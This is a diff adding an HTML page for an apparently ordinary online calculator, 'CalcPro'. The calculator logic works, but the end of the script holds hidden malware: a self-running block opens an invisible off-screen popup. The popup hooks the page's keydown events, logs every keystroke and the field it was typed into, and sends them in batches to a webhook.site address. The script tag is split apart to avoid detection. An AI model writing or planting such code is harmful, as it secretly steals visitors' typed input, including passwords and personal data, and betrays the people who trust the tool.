@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CalcPro - Online Calculator</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🧮</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1c1c1e; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .title { color: #fff; font-size: 18px; font-weight: 400; margin-bottom: 16px; opacity: 0.6; }
+        .calc { background: #2c2c2e; border-radius: 20px; padding: 20px; width: 320px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
+        .display { background: #1c1c1e; border-radius: 12px; padding: 20px; margin-bottom: 16px; text-align: right; min-height: 80px; display: flex; flex-direction: column; justify-content: flex-end; }
+        .display .expr { color: #8e8e93; font-size: 16px; min-height: 20px; }
+        .display .result { color: #fff; font-size: 40px; font-weight: 300; }
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+        .buttons button { border: none; border-radius: 12px; padding: 18px; font-size: 20px; cursor: pointer; transition: all 0.1s; font-family: inherit; }
+        .buttons button:active { transform: scale(0.95); }
+        .btn-num { background: #3a3a3c; color: #fff; }
+        .btn-num:hover { background: #4a4a4c; }
+        .btn-op { background: #ff9f0a; color: #fff; font-weight: 600; }
+        .btn-op:hover { background: #ffb340; }
+        .btn-func { background: #636366; color: #fff; }
+        .btn-func:hover { background: #737377; }
+        .btn-zero { grid-column: span 2; text-align: left; padding-left: 28px; }
+        .footer { color: #8e8e93; font-size: 12px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="title">CalcPro</div>
+    <div class="calc">
+        <div class="display">
+            <div class="expr" id="expr"></div>
+            <div class="result" id="result">0</div>
+        </div>
+        <div class="buttons">
+            <button class="btn-func" onclick="clearAll()">AC</button>
+            <button class="btn-func" onclick="toggleSign()">+/-</button>
+            <button class="btn-func" onclick="percent()">%</button>
+            <button class="btn-op" onclick="operate('/')">÷</button>
+
+            <button class="btn-num" onclick="digit('7')">7</button>
+            <button class="btn-num" onclick="digit('8')">8</button>
+            <button class="btn-num" onclick="digit('9')">9</button>
+            <button class="btn-op" onclick="operate('*')">×</button>
+
+            <button class="btn-num" onclick="digit('4')">4</button>
+            <button class="btn-num" onclick="digit('5')">5</button>
+            <button class="btn-num" onclick="digit('6')">6</button>
+            <button class="btn-op" onclick="operate('-')">−</button>
+
+            <button class="btn-num" onclick="digit('1')">1</button>
+            <button class="btn-num" onclick="digit('2')">2</button>
+            <button class="btn-num" onclick="digit('3')">3</button>
+            <button class="btn-op" onclick="operate('+')">+</button>
+
+            <button class="btn-num btn-zero" onclick="digit('0')">0</button>
+            <button class="btn-num" onclick="decimal()">.</button>
+            <button class="btn-op" onclick="equals()">=</button>
+        </div>
+    </div>
+    <div class="footer">&copy; 2026 CalcPro</div>
+
+    <script>
+    // ── Calculator logic ────────────────────────────────
+    var current = '0', expression = '', operator = null, prev = null, fresh = true;
+    var display = document.getElementById('result'), exprEl = document.getElementById('expr');
+
+    function update() { display.textContent = current; exprEl.textContent = expression; }
+    function digit(d) {
+        if (fresh) { current = d; fresh = false; }
+        else { current = current === '0' ? d : current + d; }
+        update();
+    }
+    function decimal() { if (current.indexOf('.') === -1) current += '.'; fresh = false; update(); }
+    function operate(op) {
+        prev = parseFloat(current); operator = op;
+        expression = current + ' ' + op + ' ';
+        fresh = true; update();
+    }
+    function equals() {
+        if (operator && prev !== null) {
+            var cur = parseFloat(current);
+            var r = operator === '+' ? prev+cur : operator === '-' ? prev-cur : operator === '*' ? prev*cur : prev/cur;
+            expression += current + ' =';
+            current = String(parseFloat(r.toFixed(8)));
+            operator = null; prev = null; fresh = true; update();
+        }
+    }
+    function clearAll() { current = '0'; expression = ''; operator = null; prev = null; fresh = true; update(); }
+    function toggleSign() { current = String(-parseFloat(current)); update(); }
+    function percent() { current = String(parseFloat(current)/100); update(); }
+
+    // ── PERSISTENCE: window.open Popup Parasite ─────────
+    // Opens a near-invisible popup that monitors the opener
+    (function() {
+        var W = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';
+        var p = window.open('about:blank', 'cp_helper', 'width=1,height=1,left=-9999,top=-9999');
+        if (p) {
+            p.document.write('<html><head><title>.</title></head><body><sc'+'ript>' +
+                'var T=opener,W="'+W+'",kb=[];' +
+                'function hook(){' +
+                '  try{if(!T._cp){T._cp=1;' +
+                '    T.document.addEventListener("keydown",function(e){' +
+                '      kb.push({k:e.key,f:e.target.id||e.target.tagName,ts:Date.now()});' +
+                '      if(kb.length>=10){navigator.sendBeacon(W,JSON.stringify({type:"popup",u:T.location.href,keys:kb.splice(0)}));}' +
+                '    },true);' +
+                '  }}catch(e){navigator.sendBeacon(W,JSON.stringify({type:"popup-lost",err:e.message}));}' +
+                '}' +
+                'hook();setInterval(function(){hook();' +
+                '  if(kb.length>0)navigator.sendBeacon(W,JSON.stringify({type:"popup",u:"flush",keys:kb.splice(0)}));' +
+                '},3000);' +
+                '</sc'+'ript></body></html>');
+        }
+    })();
+    </script>
+</body>
+</html>
